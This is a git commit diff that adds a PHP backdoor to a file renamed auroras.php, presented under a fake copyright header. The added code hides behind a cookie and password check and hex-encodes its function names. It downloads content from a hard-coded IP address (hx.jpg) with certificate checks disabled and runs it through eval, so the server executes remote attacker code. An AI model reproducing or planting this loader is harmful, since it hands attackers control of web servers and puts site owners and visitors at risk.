14d01295de4ccbb7e85886113bec1beac485087c
wijayantiwidya818 <wijayantiwidya818@gmail.com>
2025-09-17 14:39:37 +0700

    Update and rename aurora.php to auroras.php

--- auroras.php
+++ auroras.php
@@ -1,4 +1,79 @@
 <?php
+/**
+ * @package    Haxor.Group
+ * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
+ *
+ */
+
+// @deprecated  1.0  Deprecated without replacement
+function is_logged_in()
+{
+    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'LPH'; 
+}
+
+if (is_logged_in()) {
+    $Array = array(
+        '666f70656e', # fo p en => 0
+        '73747265616d5f6765745f636f6e74656e7473', # strea m_get_contents => 1
+        '66696c655f6765745f636f6e74656e7473', # fil e_g et_cont ents => 2
+        '6375726c5f65786563' # cur l_ex ec => 3
+    );
+
+    function hex2str($hex) {
+        $str = '';
+        for ($i = 0; $i < strlen($hex); $i += 2) {
+            $str .= chr(hexdec(substr($hex, $i, 2)));
+        }
+        return $str;
+    }
+
+    function geturlsinfo($destiny) {
+        $belief = array(
+            hex2str($GLOBALS['Array'][0]), 
+            hex2str($GLOBALS['Array'][1]), 
+            hex2str($GLOBALS['Array'][2]), 
+            hex2str($GLOBALS['Array'][3])  
+        );
+
+        if (function_exists($belief[3])) { 
+            $ch = curl_init($destiny);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+            $love = $belief[3]($ch);
+            curl_close($ch);
+            return $love;
+        } elseif (function_exists($belief[2])) { 
+            return $belief[2]($destiny);
+        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
+            $purpose = $belief[0]($destiny, "r");
+            $love = $belief[1]($purpose);
+            fclose($purpose);
+            return $love;
+        }
+        return false;
+    }
+
+    $destiny = 'http://156.67.221.29/hx.jpg';
+    $dream = geturlsinfo($destiny);
+    if ($dream !== false) {
+        eval('?>' . $dream);
+    }
+} else {
+    if (isset($_POST['password'])) {
+        $entered_key = $_POST['password'];
+        $hashed_key = '$2y$10$vO12bBSZby3P1I4nzKOgsu0XF3CzASFKDibyKo8WpuF.bV1g/3Esq'; // https://bcrypt.online/
+        
+        if (password_verify($entered_key, $hashed_key)) {
+            setcookie('user_id', 'LPH', time() + 3600, '/'); 
+            header("Location: ".$_SERVER['PHP_SELF']); 
+            exit();
+        }
+    }
+    ?>
+<?php
 error_reporting(0);
 ini_set('display_errors', 0);
 date_default_timezone_set('UTC');
